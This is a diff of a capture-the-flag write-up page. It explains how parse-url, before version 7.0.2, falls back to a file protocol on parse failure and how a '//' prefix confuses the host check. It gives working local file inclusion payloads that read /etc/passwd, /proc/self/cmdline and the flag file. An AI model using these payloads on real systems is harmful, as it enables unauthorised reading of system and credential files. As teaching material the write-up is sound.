+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="c1">// Dependencies
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kr">import</span> <span class="nx">parsePath</span> <span class="nx">from</span> <span class="s2">&#34;parse-path&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="kr">import</span> <span class="nx">normalizeUrl</span> <span class="nx">from</span> <span class="s2">&#34;normalize-url&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">parseUrl</span> <span class="o">=</span> <span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">normalize</span> <span class="o">=</span> <span class="kc">false</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">url</span> <span class="o">!==</span> <span class="s2">&#34;string&#34;</span> <span class="o">||</span> <span class="o">!</span><span class="nx">url</span><span class="p">.</span><span class="nx">trim</span><span class="p">())</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">throwErr</span><span class="p">(</span><span class="s2">&#34;Invalid url.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">url</span><span class="p">.</span><span class="nx">length</span> <span class="o">&gt;</span> <span class="nx">parseUrl</span><span class="p">.</span><span class="nx">MAX_INPUT_LENGTH</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">throwErr</span><span class="p">(</span><span class="s2">&#34;Input exceeds maximum length. If needed, change the value of parseUrl.MAX_INPUT_LENGTH.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">normalize</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="k">typeof</span> <span class="nx">normalize</span> <span class="o">!==</span> <span class="s2">&#34;object&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">          <span class="nx">normalize</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">              <span class="nx">stripHash</span><span class="o">:</span> <span class="kc">false</span>
+</span></span><span class="line"><span class="cl">          <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">url</span> <span class="o">=</span> <span class="nx">normalizeUrl</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">normalize</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="kr">const</span> <span class="nx">parsed</span> <span class="o">=</span> <span class="nx">parsePath</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">parsed</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>Inside it, we could see that the most important part of the parsing is done by the function <code>parsePath(url)</code>. Looking into the code, we could find that it comes from another library (<a href="https://www.npmjs.com/package/parse-path" target="_blank" rel="noopener noreffer ">parse-path</a>) developed by the same person. Thus, let&rsquo;s read his code! (<a href="https://github.com/IonicaBizau/parse-path" target="_blank" rel="noopener noreffer ">source</a>)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="p">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">parsePath</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="p">...</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="kr">const</span> <span class="nx">parsed</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">protocols</span> <span class="o">=</span> <span class="nx">protocols</span><span class="p">(</span><span class="nx">parsed</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">protocol</span> <span class="o">=</span> <span class="nx">output</span><span class="p">.</span><span class="nx">protocols</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">port</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">resource</span> <span class="o">=</span>  <span class="nx">parsed</span><span class="p">.</span><span class="nx">hostname</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">host</span> <span class="o">=</span>  <span class="nx">parsed</span><span class="p">.</span><span class="nx">host</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">username</span> <span class="o">||</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">password</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">password</span> <span class="o">||</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">pathname</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">pathname</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">hash</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">hash</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">search</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">search</span><span class="p">.</span><span class="nx">slice</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">parsed</span><span class="p">.</span><span class="nx">href</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">query</span> <span class="o">=</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">fromEntries</span><span class="p">(</span><span class="nx">parsed</span><span class="p">.</span><span class="nx">searchParams</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="c1">// TODO Maybe check if it is a valid local file path
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">//      In any case, these will be parsed by higher
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="c1">//      level parsers such as parse-url, git-url-parse, git-up
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="nx">output</span><span class="p">.</span><span class="nx">protocols</span> <span class="o">=</span> <span class="p">[</span><span class="s2">&#34;file&#34;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">protocol</span> <span class="o">=</span> <span class="nx">output</span><span class="p">.</span><span class="nx">protocols</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">port</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">resource</span> <span class="o">=</span>  <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">pathname</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">hash</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">search</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="nx">url</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">query</span> <span class="o">=</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">      <span class="nx">output</span><span class="p">.</span><span class="nx">parse_failed</span> <span class="o">=</span> <span class="kc">true</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nx">output</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>And this is where is starting to be interesting. As we can see, if our input crash during the <code>new URL</code> parsing, it will return the <code>file://</code> wrapper by default! Let&rsquo;s try this with a simple invalid URL:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">parseUrl</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s2">&#34;parse-url&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">parseUrl</span><span class="p">(</span><span class="s2">&#34;://mizu.re&#34;</span><span class="p">))</span>
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;protocols&#34;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&#34;file&#34;</span> <span class="p">],</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;protocol&#34;</span><span class="p">:</span> <span class="s2">&#34;file&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;port&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;resource&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;user&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;password&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;pathname&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;hash&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;search&#34;</span><span class="p">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;href&#34;</span><span class="p">:</span> <span class="s2">&#34;://mizu.re&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;query&#34;</span><span class="p">:</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>As we can see, we manage to get the <code>file://</code> wrapper.</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -305,37 +305,37 @@
 </code></pre><p><em>PS: This works only before 7.0.2 as there is no check of <code>parse_failed</code> in the main library script.</em></p>
 <h2 id="-host-confusion">🏠 Host Confusion</h2>
 <p>Well, now that we have a bypass for the <code>protocol</code> part, we need to find a way to go around the <code>host</code> check. This one is done into:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">host</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">pathname</span><span class="p">,</span> <span class="sb">`https://root-me.org/mizu`</span><span class="p">)[</span><span class="s2">&#34;host&#34;</span><span class="p">];</span>
-</code></pre></div><p>Reading the MDN documentation about this API (<a href="https://developer.mozilla.org/en-US/docs/Web/API/URL" target="_blank" rel="noopener noreffer ">source</a>), we could learn that depending of the input, the host could change. (<a href="https://developer.mozilla.org/en-US/docs/Web/API/URL/URL#examples" target="_blank" rel="noopener noreffer ">example</a>)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">host</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="nx">pathname</span><span class="p">,</span> <span class="sb">`https://root-me.org/mizu`</span><span class="p">)[</span><span class="s2">&#34;host&#34;</span><span class="p">];</span>
+</span></span></code></pre></div><p>Reading the MDN documentation about this API (<a href="https://developer.mozilla.org/en-US/docs/Web/API/URL" target="_blank" rel="noopener noreffer ">source</a>), we could learn that depending of the input, the host could change. (<a href="https://developer.mozilla.org/en-US/docs/Web/API/URL/URL#examples" target="_blank" rel="noopener noreffer ">example</a>)</p>
 <p>The problem here is that there is no example with a path in the first argument which leads to this behavior&hellip; So, it is impossible? Obviously not, trying the well-known tricks <code>//</code> and we get exactly what we want! 🎉</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s2">&#34;//127.0.0.1/a&#34;</span><span class="p">,</span> <span class="sb">`https://root-me.org/mizu`</span><span class="p">)</span>
-</code></pre></div><p>Output:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="nt">hash</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
-</span><span class="w"></span><span class="nt">host</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;127.0.0.1&#34;</span><span class="w">
-</span><span class="w"></span><span class="nt">hostname</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;127.0.0.1&#34;</span><span class="w">
-</span><span class="w"></span><span class="nt">href</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;https://127.0.0.1/a&#34;</span><span class="w">
-</span><span class="w"></span><span class="nt">origin</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;https://127.0.0.1&#34;</span><span class="w">
-</span><span class="w"></span><span class="nt">password</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
-</span><span class="w"></span><span class="nt">pathname</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;/a&#34;</span><span class="w">
-</span><span class="w"></span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
-</span><span class="w"></span><span class="nt">protocol</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;https:&#34;</span><span class="w">
-</span><span class="w"></span><span class="nt">search</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
-</span><span class="w"></span><span class="nt">searchParams</span><span class="p">:</span><span class="w">
-</span><span class="w"></span><span class="l">URLSearchParams {}</span><span class="w">
-</span><span class="w"></span><span class="nt">username</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
-</span></code></pre></div><h2 id="-lfi">📄 LFI</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s2">&#34;//127.0.0.1/a&#34;</span><span class="p">,</span> <span class="sb">`https://root-me.org/mizu`</span><span class="p">)</span>
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yml" data-lang="yml"><span class="line"><span class="cl"><span class="nt">hash</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">host</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;127.0.0.1&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">hostname</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;127.0.0.1&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">href</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;https://127.0.0.1/a&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">origin</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;https://127.0.0.1&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">password</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">pathname</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;/a&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">port</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">protocol</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;https:&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">search</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">searchParams</span><span class="p">:</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="l">URLSearchParams {}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">username</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;&#34;</span><span class="w">
+</span></span></span></code></pre></div><h2 id="-lfi">📄 LFI</h2>
 <p>Now that we have everything, let&rsquo;s try to get <code>/etc/passwd</code>:</p>
 <p>Payload: <code>https://:root-me.org//127.0.0.1/etc/passwd</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">root:x:0:0:root:/root:/bin/bash
-....
-systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
-</code></pre></div><p>Perfect! It works! Now, we need to get the flag and if we remember well the content of the challenge script, it contains this path:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kr">const</span> <span class="nx">FLAG_PATH</span> <span class="o">=</span> <span class="s2">&#34;*censored*&#34;</span><span class="p">;</span>
-</code></pre></div><p>So, we need to find a way to leak its name. To do so, we will use the <code>proc</code> linux trick: <code>https://:root-me.org//127.0.0.1/proc/self/cmdline</code> which returns the executable path of the current proccess (the challenge in the LFI context)</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="nx">node</span><span class="o">/</span><span class="kd">var</span><span class="err">/app/you_wont_guess_it.js</span>
-</code></pre></div><p>Now we can get the challenge file: <code>https://:root-me.org//127.0.0.1/var/app/you_wont_guess_it.js</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="kr">const</span> <span class="nx">FLAG_PATH</span> <span class="o">=</span> <span class="s2">&#34;a49b4e26e4b6b4638f225fb342a645ce/flag.txt&#34;</span><span class="p">;</span>
-</code></pre></div><h2 id="-flag">🎉 Flag</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
+</span></span><span class="line"><span class="cl">....
+</span></span><span class="line"><span class="cl">systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+</span></span></code></pre></div><p>Perfect! It works! Now, we need to get the flag and if we remember well the content of the challenge script, it contains this path:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">FLAG_PATH</span> <span class="o">=</span> <span class="s2">&#34;*censored*&#34;</span><span class="p">;</span>
+</span></span></code></pre></div><p>So, we need to find a way to leak its name. To do so, we will use the <code>proc</code> linux trick: <code>https://:root-me.org//127.0.0.1/proc/self/cmdline</code> which returns the executable path of the current proccess (the challenge in the LFI context)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">node</span><span class="o">/</span><span class="kd">var</span><span class="err">/app/you_wont_guess_it.js</span>
+</span></span></code></pre></div><p>Now we can get the challenge file: <code>https://:root-me.org//127.0.0.1/var/app/you_wont_guess_it.js</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kr">const</span> <span class="nx">FLAG_PATH</span> <span class="o">=</span> <span class="s2">&#34;a49b4e26e4b6b4638f225fb342a645ce/flag.txt&#34;</span><span class="p">;</span>
+</span></span></code></pre></div><h2 id="-flag">🎉 Flag</h2>
 <p>The last step is to get the flag: <code>https://:root-me.org//127.0.0.1/var/app/a49b4e26e4b6b4638f225fb342a645ce/flag.txt</code> :D</p>
 <p>Flag: <code>RM{T4k3_C4R3_0f_Y0uR_URL_P4rs3R}</code> 🎉</p>
 </div><div class="post-footer" id="post-footer">
@@ -353,7 +353,7 @@ systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbi
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeups/">writeups</a>,&nbsp;<a href="/tags/ctf10k/">CTF10k</a>,&nbsp;<a href="/tags/lfi/">LFI</a>,&nbsp;<a href="/tags/challenge/">Challenge</a>,&nbsp;<a href="/tags/protocol-confusion/">Protocol Confusion</a></section>
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeups/">Writeups</a>,&nbsp;<a href="/tags/ctf10k/">CTF10k</a>,&nbsp;<a href="/tags/lfi/">LFI</a>,&nbsp;<a href="/tags/challenge/">Challenge</a>,&nbsp;<a href="/tags/protocol-confusion/">Protocol Confusion</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
@@ -364,7 +364,7 @@ systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbi
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://root-me.org" target="_blank">Root-Me</a></span>&nbsp;|&nbsp;<span class="license">contact@root-me.org | <a href='/privacy/'>Privacy</a></span></div>
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023 - 2025</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://root-me.org" target="_blank">Root-Me</a></span>&nbsp;|&nbsp;<span class="license">contact@root-me.org | <a href='/privacy/'>Privacy</a></span></div>
         </div>
     </footer></div>
 
